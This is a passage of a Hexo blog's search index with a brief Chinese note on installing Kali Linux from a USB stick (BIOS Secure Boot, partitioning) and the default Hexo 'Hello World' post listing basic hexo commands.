        <content type="html"><![CDATA[<h2 id="kali装机过程"><a href="#kali装机过程" class="headerlink" title="kali装机过程"></a>kali装机过程</h2><p>磁盘管理</p><p>设别管理器</p><p>系统信息</p><p>下载系统iso文件 rufus 3.14 将内容刻录到u盘</p><p>关机开机后，按住F1</p><p>进入bios窗口，选Security  进入Security Boot 将Secure Boot改为Disabled</p><p>F10退出 按住F12 进入Boot Menu 选使用用来装机的USB设备，回车</p><p>进入kali界面，卡了一下，等待</p><p>图形化安装，选择语言和国家</p><p>安装完毕后，连接WIFI</p><p>磁盘分区，选择整个磁盘（前提是备份电脑中的所有内容），选择电脑（最大的）的磁盘</p><p>放在同一分区下，确定后选择“是”要更改</p><p>最后一步，直接重启，先不拔出USB</p><p>拔出USB后，需要对u盘重新分区，使用windows的diskpart命令和磁盘管理。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/04/hello-world/"/>
      <url>/2022/01/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
